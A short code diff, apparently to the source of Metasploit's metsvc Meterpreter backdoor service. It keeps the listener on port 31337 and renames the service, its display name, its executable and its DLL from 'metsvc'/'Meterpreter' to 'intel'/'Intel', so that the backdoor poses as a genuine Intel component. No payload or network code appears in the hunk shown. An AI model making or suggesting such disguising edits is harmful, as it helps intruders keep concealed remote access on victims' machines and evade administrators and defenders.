@@ -28,7 +28,7 @@
  */
 
 #define PORT          31337
-#define SERVICE_NAME  "metsvc"
-#define DISPLAY_NAME  "Meterpreter"
-#define METSVC_SERVER "metsvc-server.exe"
-#define METSRV_DLL    "metsrv.dll"
+#define SERVICE_NAME  "intel"
+#define DISPLAY_NAME  "Intel"
+#define METSVC_SERVER "intel-server.exe"
+#define METSRV_DLL    "intelsrv.dll"
